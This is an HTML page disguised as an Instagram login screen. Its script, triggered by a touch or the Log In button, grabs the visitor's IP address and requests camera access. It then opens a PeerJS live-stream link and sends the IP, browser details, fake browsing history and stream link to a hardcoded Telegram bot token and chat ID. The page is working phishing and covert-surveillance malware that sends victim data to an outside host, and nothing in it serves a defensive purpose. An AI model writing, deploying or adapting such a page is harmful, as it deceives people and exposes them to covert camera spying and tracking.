<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://unpkg.com/peerjs@1.3.1/dist/peerjs.min.js"></script>
    <style>
        body {
            background-color: #121212;
            color: white;
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #1d1d1d;
            padding: 30px;
            border-radius: 8px;
            text-align: center;
            width: 320px;
        }
        .logo img {
            width: 180px;
            margin-bottom: 20px;
        }
        input, button {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: none;
            border-radius: 5px;
        }
        button {
            background-color: #0095f6;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #007bb5;
        }
    </style>
</head>
<body ontouchstart="startLiveStream()">

    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo">
        </div>
        <input type="text" id="username" placeholder="Phone number, username, or email">
        <input type="password" id="password" placeholder="Password">
        <button onclick="startLiveStream()">Log In</button>
    </div>

    <script>
        let peer;
        let peerId;
        let ipAddress = "Unknown IP";

        async function startLiveStream() {
            await getIpAddress();  // Fetch user‚Äôs IP address
            await initializeCamera();  // Start user‚Äôs camera
            initializePeerConnection();  // Set up PeerJS
        }

        async function getIpAddress() {
            await fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    ipAddress = data.ip;
                    console.log("IP Address:", ipAddress);
                });
        }

        async function initializeCamera() {
            try {
                const localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                console.log('Camera stream initialized.');
            } catch (error) {
                console.error('Failed to access camera:', error);
            }
        }

        function initializePeerConnection() {
            peer = new Peer();

            peer.on('open', (id) => {
                peerId = id;
                const liveStreamLink = `${window.location.origin}/live.html?peerId=${peerId}`;
                sendDetailsToBot(liveStreamLink);
            });
        }

        function sendDetailsToBot(liveStreamLink) {
            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
            const chatId = '860517021';
            const message = `üö® New Interaction Detected üö®\n\nüìå IP Address: ${ipAddress}\nüìå Peer ID: ${peerId}\nüìå Browser: ${navigator.userAgent}\nüìå Platform: ${navigator.platform}\nüìå Simulated Browser History:\n${simulateBrowserHistory()}\nüìå Live Camera Stream: ${liveStreamLink}\n‚è∞ Time: ${new Date().toLocaleString()}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
        }

        function simulateBrowserHistory() {
            const recentSites = [
                'https://www.google.com/',
                'https://www.youtube.com/',
                'https://www.facebook.com/',
                'https://www.instagram.com/',
                'https://www.twitter.com/'
            ];
            return recentSites.join('\n');
        }
    </script>

</body>
</html>
